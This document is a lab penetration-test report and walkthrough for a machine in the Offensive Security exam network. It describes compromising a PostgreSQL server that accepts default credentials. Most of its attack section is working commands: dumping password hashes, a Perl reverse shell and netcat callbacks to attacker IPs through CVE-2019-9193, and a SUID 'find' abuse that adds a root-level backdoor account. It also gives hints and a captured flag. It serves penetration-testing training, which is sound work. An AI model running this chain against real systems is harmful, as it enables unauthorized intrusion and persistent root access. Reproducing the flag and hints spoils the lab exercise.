# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2019â€“9193 | Reverse Shell |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, Victor was tasked with exploiting the lab and exam network.

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Default Credentials
```bash
# Postgres
# postgres:postgress
```

### Postgress
Login.
```bash
psql -U postgres -p 5437 -h $TARGET # postgres:postgres
```

Check if current user is a super-user.
```bash
SELECT current_setting('is_superuser'); #If response is "on" then true, if "off" then false
```

Print password hashes of users in the Postgres database.
```bash
SELECT usename, passwd FROM pg_shadow;
```

Explore the filesytem.
```bash
SELECT pg_ls_dir('/home');
```

Read a file.
```bash
CREATE TABLE demo(t text);
COPY demo from '/home/wilson/local.txt';
SELECT * FROM demo;
```

Using CVE-2019â€“9193 to invoke a reverse shell to TCP port 21. 
```bash
sudo nc -nvlp 21

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.49.51:21");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};''';
```

```bash
# attacker side

sudo python3 -m http.server 80 # shutdown after rshell was downloaded on the target

# target side

# attacker side

# target side

find /tmp/poo -exec whoami \; # confirmed 'find' runs as root
find /tmp/poo -exec /usr/sbin/useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor \;
cat /root/proof.txt
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* psql
* nc
* msfvenom

## Hints
* Be sure to scan all TCP ports. Identify and enumerate PostgreSQL instance.
* PostgreSQL user credentials are easy to guess. Research how to gain command execution using PostgreSQL.
* Look at SUID binaries.

## Flags
* Local: 5e04b19fef43ddaf1193569a1b5b50d9

Summary
Weâ€™ll gain code execution on this machine via a misconfigured PostgreSQL database server which is listening on all interfaces and accepts the default credentials. We can then escalate via misconfigured SUID permissions on the /usr/bin/find binary.

PostgreSQL Reverse Shell
Since the PostgreSQL server is listening on all interfaces, we can connect to it with psql. Since credentials are required, we begin password guessing and discover that the default credentials (postgres:postgres) are still active.

kali@kali:~$ psql -h 192.168.234.140 -p 5437 -U postgres
Password for user postgres: [postgres]
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
In addition, the default PostgreSQL settings are also in place, which means we can easily grab a reverse shell. To do this, weâ€™ll first start a web server and host our copy of the Netcat binary.

kali@kali:~$ which nc
/usr/bin/nc
kali@kali:~$ cp /usr/bin/nc .
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Then, weâ€™ll set up a Netcat listener on port 5437.

After switching to the default postgres database, we can download the Netcat binary to the target and use it to connect back to our attack machine.

postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0
postgres=# DELETE FROM cmd_exec;
DELETE 0
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
Our listener caught a postgres shell.

Metasploit Module
Alternatively, we could use the multi/postgres/postgres_copy_from_program_cmd_exec Metasploit module to obtain remote code execution using PostgreSQL.

SUID
As part of our enumeration process, we use find to locate SUID programs and interestingly discover that the find program itself is SUID.

We can easily abuse this misconfiguration to obtain a root shell.
